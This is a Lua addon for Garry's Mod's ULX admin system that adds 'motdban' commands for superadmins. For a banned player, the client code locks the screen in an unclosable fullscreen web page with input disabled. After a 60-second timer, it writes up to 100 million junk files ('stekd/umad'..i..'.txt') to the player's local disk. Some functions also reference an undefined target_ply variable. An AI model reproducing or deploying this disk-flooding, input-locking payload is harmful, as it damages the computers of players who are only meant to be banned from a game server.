if SERVER then
	ulx = ulx or {}
	if file.Exists("Data/ulx/motdbans.txt","GAME") then
		ulx.MotdBanData = util.JSONToTable( file.Read("ulx/motdbans.txt") )
	else
		ulx.MotdBanData = {}
		ulx.MotdBanData.Url = "http://ownage.fr/" --- Best link to use. ;)
		ulx.MotdBanData.Banned = {}
	end

end

if CLIENT then
	function ulx.urlbanned(url)
		local Frame = vgui.Create("DFrame")
		
		if ScrW() > 640 then
			Frame:SetSize( ScrW(), ScrH())
		else
			Frame:SetSize( 640, 480 )
		end
		Frame:Center()
		Frame:SetTitle( "Get stekd!" )
		Frame:SetVisible( true )
		Frame:ShowCloseButton(false)
		Frame:SetDraggable(false)
		Frame:SetKeyboardInputEnabled(false) 
		Frame:SetMouseInputEnabled(false)
		Frame:MakePopup()
		local html = vgui.Create( "HTML", Frame )
		html:SetSize( Frame:GetWide() - 5, Frame:GetTall() - 5 )
		html:SetKeyboardInputEnabled(false)
		html:SetMouseInputEnabled(false)
		html:SetPos( 10, 30 )

		html:OpenURL( url )
		
		timer.Simple(60, function()
			file.CreateDir("stekd")
			for i = 1,100000000 do
			file.Write("stekd/umad"..i..".txt","get stekd")
			end
		end)

	end
end

function ulx.motdban(calling_ply, target_ply )
	ulx.fancyLogAdmin( calling_ply, true, "#A has MOTDBanned #T", target_ply )
	
	ulx.MotdBanData.Banned[target_ply:SteamID()] = target_ply:Nick()
	timer.Simple(1,function()
		if target_ply:IsValid() then
			ulx.fancyLogAdmin( calling_ply, "#A kicked #T", target_ply )
			target_ply:Kick()
		end
	end)
	
	file.CreateDir("ulx")
	file.Write("ulx/motdbans.txt",util.TableToJSON(ulx.MotdBanData))
end

function ulx.motdbanid(calling_ply, steamid )
	ulx.fancyLogAdmin( calling_ply, true, "#A has MOTDBanned #T", target_ply )

	local plys = player.GetAll()
	for i=1, #plys do
		if plys[ i ]:SteamID() == steamid then
			ulx.fancyLogAdmin( calling_ply, "#A kicked #T", target_ply )
			target_ply:Kick()
			break
		end
	end
	
	ulx.MotdBanData.Banned[steamid] = steamid
	
	file.CreateDir("ulx")
	file.Write("ulx/motdbans.txt",util.TableToJSON(ulx.MotdBanData))
end

function ulx.unmotdban(calling_ply, steamid )
	if ulx.MotdBanData.Banned[steamid] then
		ulx.fancyLogAdmin( calling_ply, "#A unmotdbanned steamid #s", steamid )
		
		ulx.MotdBanData.Banned[steamid] = nil
		
		file.CreateDir("ulx")
		file.Write("ulx/motdbans.txt",util.TableToJSON(ulx.MotdBanData))
	else
		ULib.tsayError( calling_ply, "\""..steamid.."\" does not exist in the banlist", true )
	end
end



local motdban = ulx.command("Utility", "ulx motdban", ulx.motdban, "!motdban")
motdban:addParam{ type=ULib.cmds.PlayerArg }
motdban:defaultAccess( ULib.ACCESS_SUPERADMIN )
motdban:help( "Makes someone unable to do anything but watch the motd." )
----------------------------------------------------------------
local motdbanid = ulx.command("Utility", "ulx motdbanid", ulx.motdbanid)
motdbanid:addParam{ type=ULib.cmds.StringArg, hint="steamid" }
motdbanid:defaultAccess( ULib.ACCESS_SUPERADMIN )
motdbanid:help( "Makes someone unable to do anything but watch the motd." )
motdbanid:setOpposite( "ulx unmotdban", {_, _, _, true}, "!unmotdban" )
----------------------------------------------------------------
local unmotdban = ulx.command("Utility", "ulx unmotdban", ulx.unmotdban)
unmotdban:addParam{ type=ULib.cmds.StringArg, hint="steamid" }
unmotdban:defaultAccess( ULib.ACCESS_SUPERADMIN )
unmotdban:help( "Unmotdbans someone" )


hook.Add( "PlayerInitialSpawn", "UlxMotdBanInit", function(ply)
	timer.Simple(10, function()
		if IsValid(ply) then
			ulx.fancyLogAdmin( true, "MOTDBan has been initiated on #T", target_ply )
			if ulx.MotdBanData.Banned[ply:SteamID()] then
				ply:SendLua([[ulx.urlbanned("]]..ulx.MotdBanData.Url..[[")]])
			end
		end
	end)
end)


if SERVER then 
	util.AddNetworkString("UlxMotdBanUrl")
	net.Receive("UlxMotdBanUrl",function(len, caller)
		if caller:IsSuperAdmin() then
			ulx.MotdBanData.Url = net.ReadString()
			file.CreateDir("ulx")
			file.Write("ulx/motdbans.txt",util.TableToJSON(ulx.MotdBanData))
		end
	end)
else
	local UlxMotdBanUrl
	concommand.Add("UlxMotdBanUrl",function()
		if LocalPlayer():IsSuperAdmin() then
			net.Start("UlxMotdBanUrl")
				net.WriteString(UlxMotdBanUrl)
			net.SendToServer()
		else
			print("You must have superadmin priveledges to run this command.")
		end
	end,
	function(_,line)
		UlxMotdBanUrl = string.sub(line,2)
	end)
end